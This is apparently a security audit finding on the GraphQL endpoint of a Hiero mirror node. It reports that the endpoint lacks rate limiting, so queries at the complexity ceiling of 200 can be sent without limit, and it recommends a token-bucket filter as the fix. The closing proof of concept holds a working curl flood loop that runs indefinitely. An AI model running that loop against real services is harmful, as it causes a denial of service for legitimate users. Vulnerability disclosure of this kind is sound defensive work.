### Title
Unbounded Request Flooding via Max-Complexity GraphQL Queries Due to Missing Rate Limiting

### Summary
The `graphQlCustomizer()` bean in `GraphQlConfiguration.java` configures `MaxQueryComplexityInstrumentation(200)` but no rate-limiting mechanism exists anywhere in the `graphql` module. An unprivileged attacker can craft queries at exactly complexity=200 — the highest cost that still passes the check — and flood the endpoint without restriction, causing the complexity analysis instrumentation and downstream database execution to run at maximum cost on every request, exhausting CPU and HikariCP database connections.

### Finding Description
**Exact code path:**

`graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java`, `graphQlCustomizer()`, lines 42–49:

```java
var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);
return b -> b.configureGraphQl(
        graphQL -> graphQL.instrumentation(instrumentation).preparsedDocumentProvider(provider));
```

**Root cause — two compounding gaps:**

1. `MaxQueryComplexityInstrumentation(200)` rejects queries with complexity **strictly greater than** 200. A query at exactly 200 passes unconditionally and triggers the full AST-traversal cost calculation on every execution. This instrumentation runs during `beginExecution`, which is **outside** the `PreparsedDocumentProvider` cache scope. The cache (keyed on raw query string, `CachedPreparsedDocumentProvider` line 26) only skips parse+validate; the complexity walk still executes per-request.

2. A grep across all `graphql/**/*.java` returns **zero matches** for `ThrottleConfiguration`, `RateLimiter`, `bucket4j`, or `requestsPerSecond`. The rate-limiting infrastructure present in the `web3` module (`ThrottleConfiguration`, `ThrottleManagerImpl`) is entirely absent from the `graphql` module. The only filters registered are `LoggingFilter` and `MetricsConfiguration` — neither enforces a request budget.

**Exploit flow:**

- Parser limits (`maxTokens=1000`, `maxCharacters=10000`) bound the size of any single query but impose no per-second request cap.
- An attacker constructs a valid GraphQL query whose field-selection set scores exactly 200 in graphql-java's default complexity model (each field = 1 by default, so ~200 leaf fields within the depth-10 limit).
- The attacker sends this query in a tight loop from one or more clients with no authentication required (the endpoint is public per the README: `curl -X POST http://localhost:8083/graphql/alpha`).
- Each request: (a) runs the full `MaxQueryComplexityInstrumentation` AST traversal, (b) passes the check, (c) proceeds to data-fetcher execution and issues a real database query via HikariCP.

### Impact Explanation
With no rate limiter, the attacker can saturate the Tomcat thread pool and exhaust the HikariCP connection pool simultaneously. The Prometheus alert thresholds in `charts/hedera-mirror-graphql/values.yaml` confirm the operators consider `hikaricp_connections_active / hikaricp_connections_max > 0.75` and `process_cpu_usage > 0.8` to be critical conditions. Sustained flooding at complexity=200 drives both metrics to their limits, rendering the service unable to serve legitimate requests and unable to acquire new database connections — matching the "network partition" symptom described (the pod becomes unreachable to the database tier). Severity: **High** (unauthenticated, no preconditions, full service DoS).

### Likelihood Explanation
No authentication or API key is required. The GraphQL schema is introspectable, making it trivial to enumerate fields and construct a complexity=200 query. A single attacker with a scripted HTTP client (e.g., `ab`, `wrk`, or a simple loop) can sustain thousands of requests per second. The attack is repeatable and requires no special knowledge beyond the public endpoint URL and schema.

### Recommendation
Add a rate-limiting servlet filter to the `graphql` module mirroring the `web3` module's `ThrottleConfiguration` / `ThrottleManagerImpl` pattern (bucket4j token bucket, configurable `requestsPerSecond`). Apply it before the GraphQL dispatcher so requests are rejected at the HTTP layer before any instrumentation or data-fetcher cost is incurred. Additionally, consider making the complexity ceiling configurable and lowering it, or applying per-IP connection limits at the ingress/load-balancer layer as a defense-in-depth measure.

### Proof of Concept
```bash
# 1. Introspect schema to enumerate fields (no auth required)
curl -s -X POST http://<host>:8083/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# 2. Construct a query with ~200 leaf fields (complexity = 200, depth ≤ 10)
#    Example: repeat a cheap scalar field 200 times in one selection set
QUERY='{"query":"{ account(input:{entityId:{shard:0,realm:0,num:2}}) { balance alias autoRenewPeriod createdTimestamp declineReward deleted ethereumNonce evmAddress expirationTimestamp id key maxAutomaticTokenAssociations memo pendingReward receiverSigRequired stakedAccountId stakedNodeId stakePeriodStart type balance alias autoRenewPeriod createdTimestamp declineReward deleted ethereumNonce evmAddress expirationTimestamp id key maxAutomaticTokenAssociations memo pendingReward receiverSigRequired stakedAccountId stakedNodeId stakePeriodStart type balance alias autoRenewPeriod createdTimestamp declineReward deleted ethereumNonce evmAddress expirationTimestamp id key maxAutomaticTokenAssociations memo pendingReward receiverSigRequired stakedAccountId stakedNodeId stakePeriodStart type } }"}'

# 3. Flood with no rate limit (runs indefinitely, no auth needed)
while true; do
  curl -s -o /dev/null -X POST http://<host>:8083/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "$QUERY" &
done
# Observe: hikaricp_connections_active and process_cpu_usage spike to critical thresholds
# Service becomes unresponsive; database connection pool exhausted
```